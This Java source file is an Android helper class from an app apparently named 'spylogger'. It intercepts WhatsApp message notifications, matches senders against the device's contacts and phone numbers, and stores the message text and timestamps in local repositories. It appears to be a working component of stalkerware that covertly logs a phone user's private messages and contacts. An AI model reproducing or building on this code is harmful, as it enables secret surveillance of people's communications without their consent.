package com.gravatasufoca.spylogger.helpers;

import android.app.Notification;
import android.content.Context;
import android.database.Cursor;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.service.notification.StatusBarNotification;

import com.gravatasufoca.spylogger.model.Mensagem;
import com.gravatasufoca.spylogger.model.TipoMensagem;
import com.gravatasufoca.spylogger.model.TipoMidia;
import com.gravatasufoca.spylogger.model.Topico;
import com.gravatasufoca.spylogger.repositorio.RepositorioMensagem;
import com.gravatasufoca.spylogger.repositorio.RepositorioTopico;
import com.gravatasufoca.spylogger.repositorio.impl.RepositorioMensagemImpl;
import com.gravatasufoca.spylogger.repositorio.impl.RepositorioTopicoImpl;
import com.gravatasufoca.spylogger.utils.Utils;
import com.gravatasufoca.spylogger.vos.ContatoVO;

import java.sql.SQLException;
import java.util.Date;
import java.util.List;

/**
 * Created by bruno on 04/06/17.
 */

public abstract class MensagemNotificacao {

    protected Context context;
    private RepositorioTopico repositorioTopico;
    private RepositorioMensagem repositorioMensagem;
    private List<ContatoVO> contatos;
    private StatusBarNotification sbn;
    protected ContatoVO contato;

    public MensagemNotificacao(Context context,StatusBarNotification sbn) {
        this.context = context;
        contatos= Utils.getContatos(context.getContentResolver());
        this.sbn = sbn;
        Bundle extras = getSbn().getNotification().extras;
        this.contato=getContato(extras.get("android.people")!=null?((String[]) extras.get("android.people"))[0]:null);
        add();
    }

    protected abstract void add();
    protected abstract String getTexto();

    protected RepositorioMensagem getRepositorioMensagem() {
        if (repositorioMensagem == null) {
            try {
                repositorioMensagem = new RepositorioMensagemImpl(context);
            } catch (SQLException e) {
            }
        }
        return repositorioMensagem;
    }

    protected RepositorioTopico getRepositorioTopico() {
        if (repositorioTopico == null) {
            try {
                repositorioTopico = new RepositorioTopicoImpl(context);
            } catch (SQLException e) {
            }
        }
        return repositorioTopico;
    }


    private ContatoVO getContato(String uri) {
        Cursor cursor = Utils.getCursorContato(context, uri);
        if (cursor != null && contatos != null) {
            String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
            for (ContatoVO contato : contatos) {
                if (contato.getSourceId().equals(id)){
                    contato.setNumero(Utils.getPhoneNumber(context.getContentResolver(),id));
                    return contato;
                }
            }
        }
        return null;
    }


    protected StatusBarNotification getSbn() {
        return sbn;
    }

    private Topico getTopico(){
        Topico topico=null;
        if(contato!=null && contato.getSourceId()!=null && !contato.getSourceId().isEmpty()){
            topico=getRepositorioTopico().porReferencia(contato.getSourceId());
        }
        if(topico==null){
            topico=new Topico.TopicoBuilder().build(TipoMensagem.WHATSAPP);
        }
        if(contato!=null && contato.getSourceId()!=null && !contato.getSourceId().isEmpty()){
            topico.setIdReferencia(contato.getSourceId());
        }else{
            topico.setIdReferencia(contato.getNumero());
        }

        topico.setNome(getMsgInfo(Notification.EXTRA_TITLE));
        topico.setGrupo(false);
        return topico;
    }

    protected Mensagem getMensagem(){
        Topico topico=getTopico();
        if(topico!=null) {
            Mensagem mensagem = new Mensagem.MensagemBuilder()
                    .setTopico(topico)
                    .setNumeroContato(contato.getNumero())
                    .setTexto(getTexto())
                    .setContato(contato.getNumero())
                    .setTipoMidia(TipoMidia.TEXTO)
                    .setData(new Date(sbn.getPostTime()))
                    .setDataRecebida(new Date())
                    .setIdReferencia("-1")
                    .build();
            return mensagem;
        }
        return null;
    }

    protected String getMsgInfo(String info){
        return getSbn().getNotification().extras.getString(info);
    }

}
